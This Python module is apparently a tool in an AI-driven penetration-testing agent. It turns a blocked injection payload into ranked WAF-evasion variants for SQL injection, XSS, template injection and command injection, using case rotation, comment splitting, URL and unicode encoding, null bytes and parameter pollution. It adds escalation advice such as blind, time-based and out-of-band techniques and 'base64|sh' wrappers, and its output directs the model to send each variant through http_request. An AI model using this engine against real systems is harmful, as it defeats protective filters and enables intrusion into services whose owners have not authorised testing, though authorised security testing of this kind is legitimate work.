"""payload_mutate — the evasion variant engine (analysis-only).

The missing piece between "found injection" and "the WAF ate it":
base payload + block evidence → ranked evasion variants across mutation
families (case, comments, encoding, whitespace, structural splits),
with family-escalation advice when variants keep dying. The MODEL fires
each variant itself through its normal one-tool-per-turn flow — pacing
stays under its own judgment (operator design: analysis-only).
"""

from __future__ import annotations

import re


def _sql_case_rotate(p: str) -> str:
    return "".join(c.upper() if i % 2 else c.lower() for i, c in enumerate(p))


def _sql_comment_split(p: str) -> str:
    return re.sub(r"\s+", "/**/", p.strip(), count=3)


def _sql_concat(p: str) -> str:
    return p.replace(" OR ", " O/**/R ").replace("' OR", "'O/**/R")


def _url_encode(p: str, double: bool = False) -> str:
    from urllib.parse import quote

    out = quote(p, safe="")
    return quote(out, safe="") if double else out


def _whitespace_forms(p: str) -> list[str]:
    return [
        p.replace(" ", "%09"),
        p.replace(" ", "%0a"),
        p.replace(" ", "\t"),
    ]


def _unicode_overlong(p: str) -> str:
    swaps = {"'": "%u0027", '"': "%u0022", " ": "%u0020", "<": "%u003c", ">": "%u003e"}
    return "".join(swaps.get(c, c) for c in p)


def _null_terminate(p: str) -> str:
    return p + "%00"


def _hpp(p: str) -> str:
    """HTTP parameter pollution form: dupe the payload's first param."""
    m = re.match(r"^([^=]+)=([^&]*)", p)
    return f"{m.group(1)}={m.group(2)}&{m.group(1)}={m.group(2)}" if m else p


def detect_class(payload: str) -> str:
    p = (payload or "").lower()
    if any(k in p for k in ("select", "union", "'", " or ", "and 1", "sleep(", "substr")):
        return "sql"
    if "<" in p or "script" in p or "onerror" in p or "alert" in p:
        return "xss"
    if "{{" in p or "{%" in p or "${" in p:
        return "ssti"
    if any(k in p for k in (";", "&&", "|", "`", "$(")):
        return "cmd"
    return "generic"


def payload_mutate(payload: str = "", blocked_response: str = "", vuln_class: str = "") -> str:
    """Ranked evasion variants + escalation advice. Analysis-only."""
    try:
        p = str(payload or "").strip()
        if not p:
            return "Error: payload required. Pass the blocked payload and (optionally) the blocked response."
        cls = (vuln_class or detect_class(p)).lower()
        blocked = str(blocked_response or "")
        variants: list[tuple[str, str]] = []

        if cls == "sql":
            variants = [
                ("case-rotation", _sql_case_rotate(p)),
                ("inline comments", _sql_comment_split(p)),
                ("comment-split keywords", _sql_concat(p)),
                ("URL-encoded", _url_encode(p)),
                ("double-URL-encoded", _url_encode(p, double=True)),
                ("tab/newline whitespace", _whitespace_forms(p)[0]),
                ("null-terminated", _null_terminate(p)),
            ]
        elif cls == "xss":
            variants = [
                ("URL-encoded", _url_encode(p)),
                ("double-URL-encoded", _url_encode(p, double=True)),
                ("unicode overlong", _unicode_overlong(p)),
                ("tab separator", _whitespace_forms(p)[0]),
                ("null-terminated", _null_terminate(p)),
            ]
        elif cls in ("ssti", "cmd"):
            variants = [
                ("URL-encoded", _url_encode(p)),
                ("double-URL-encoded", _url_encode(p, double=True)),
                ("unicode overlong", _unicode_overlong(p)),
                ("null-terminated", _null_terminate(p)),
            ]
        else:
            variants = [
                ("URL-encoded", _url_encode(p)),
                ("double-URL-encoded", _url_encode(p, double=True)),
                ("unicode overlong", _unicode_overlong(p)),
            ]

        lines = [
            f"payload_mutate — class={cls}, {len(variants)} variants (fire them one at a time through http_request):"
        ]
        for name, v in variants:
            lines.append(f"  [{name}] {v[:200]}")

        hard_block = re.search(r"\b(403|404|blocked|forbidden|waf|filter)\b", blocked, re.I)
        if hard_block and blocked:
            ladder = {
                "sql": "family escalation: reflected is filtered → BLIND (boolean via response-length diff) → TIME-BASED (delay markers) → OUT-OF-BAND (DNS/HTTP callbacks)",
                "xss": "family escalation: inline filtered → event-handler attributes → DOM sink via location/hash → stored contexts",
                "ssti": "family escalation: {{7*7}} filtered → {7*7} / #set / ${} alternates → blind via error-based oracle",
                "cmd": "family escalation: ';' filtered → '|', '&&', '$()', backticks → IFS whitespace tricks → encoding wrappers (base64|sh)",
            }
            lines.append(f"block evidence detected → {ladder.get(cls, 'switch payload family or surface')}")
        lines.append("Pacing stays yours: one variant per request, respect program rate limits.")
        return "\n".join(lines)
    except Exception as e:  # noqa: BLE001 — tools return strings, never raise
        return f"Error: payload_mutate failed: {e}"
